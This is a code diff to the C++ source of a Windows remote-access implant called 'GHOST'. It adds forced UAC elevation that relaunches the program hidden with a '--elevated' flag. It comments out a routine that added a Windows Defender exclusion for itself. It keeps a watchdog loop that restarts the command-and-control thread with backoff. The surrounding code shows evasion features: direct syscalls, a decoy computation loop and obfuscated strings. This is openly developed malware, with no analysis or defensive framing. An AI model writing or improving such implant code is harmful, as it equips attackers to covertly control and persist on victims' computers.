@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <algorithm>
+#include <shellapi.h>          // for ShellExecuteExW
 #include "syscalls.hpp"
 #include "evasion.hpp"
 #include "c2.hpp"
@@ -31,6 +32,38 @@ static void NtSleep(DWORD ms) {
 static void DecoyLoop() {
     volatile unsigned long long fib = 1, a = 0, b = 1;
     for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
+}
+
+// ──────────────────────────────────────────────────────────────
+//  ADMIN ELEVATION — force UAC prompt if not already admin
+// ──────────────────────────────────────────────────────────────
+static BOOL EnsureElevated() {
+    if (IsElevated()) return TRUE;
+
+    wchar_t exePath[MAX_PATH] = {};
+    GetModuleFileNameW(NULL, exePath, MAX_PATH);
+
+    SHELLEXECUTEINFOW sei = {};
+    sei.cbSize = sizeof(sei);
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+    sei.lpVerb = L"runas";               // triggers UAC prompt
+    sei.lpFile = exePath;
+    sei.lpParameters = L"--elevated";    // optional flag to avoid re‑relaunch
+    sei.nShow = SW_HIDE;
+
+    if (ShellExecuteExW(&sei)) {
+        // Wait a moment for the new process to start, then exit current
+        Sleep(1000);
+        return FALSE;   // tell caller to exit
+    }
+
+    // If elevation fails, show a message and exit
+    MessageBoxW(NULL,
+        L"GHOST requires administrator privileges to run.\n\n"
+        L"Please run as Administrator.",
+        L"Elevation Required",
+        MB_ICONERROR | MB_OK);
+    return FALSE;
 }
 
 DWORD WINAPI ImplantThread(LPVOID) {
@@ -83,11 +116,12 @@ DWORD WINAPI ImplantThread(LPVOID) {
     printf("[DEBUG] Exe path: %S\n", exePath);
     fflush(stdout);
 
-    if (IsElevated()) {
-        printf("[DEBUG] Running elevated – adding Defender exclusion\n");
-        fflush(stdout);
-        AddDefenderExclusion(exePath);
-    }
+    // ─── Defender exclusion removed – too noisy ───
+    // if (IsElevated()) {
+    //     printf("[DEBUG] Running elevated – adding Defender exclusion\n");
+    //     fflush(stdout);
+    //     AddDefenderExclusion(exePath);
+    // }
 
     // ──────────────────────────────────────────────────────────────
     //  SKIP PERSISTENCE – test C2 core
@@ -106,11 +140,23 @@ DWORD WINAPI ImplantThread(LPVOID) {
     return 0;  // watchdog sees 0 → stop
 }
 
-int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
+int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     printf("[DEBUG] WinMain entered\n");
     fflush(stdout);
 
     SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
+
+    // ─── Elevate if not already admin ──────────────────────────────
+    // Check if we already have the "--elevated" flag to avoid re‑elevating
+    if (strstr(lpCmdLine, "--elevated") == nullptr) {
+        if (!EnsureElevated()) {
+            printf("[DEBUG] Elevation requested – exiting current process.\n");
+            fflush(stdout);
+            return 0;
+        }
+    }
+    printf("[DEBUG] Running with administrator privileges.\n");
+    fflush(stdout);
 
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
     if (!hKernel32) return 0;
@@ -124,17 +170,10 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     }
 
     // ── WATCHDOG RESTART LOOP ─────────────────────────────────────────────
-    // ImplantThread exits on:
-    //   0  — clean operator 'exit' command → we honor it and stop
-    //   1+ — crash, exception, or network failure → restart with backoff
-    //
-    // Backoff schedule: 5s → 10s → 20s → 40s → 60s (capped)
-    // ─────────────────────────────────────────────────────────────────────
     DWORD restartCount = 0;
 
     while (true) {
         if (restartCount > 0) {
-            // Exponential backoff capped at 60 seconds
             DWORD backoffMs = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
             printf("[DEBUG] Watchdog: restarting ImplantThread in %lus (restart #%lu)\n",
                    backoffMs / 1000, restartCount);
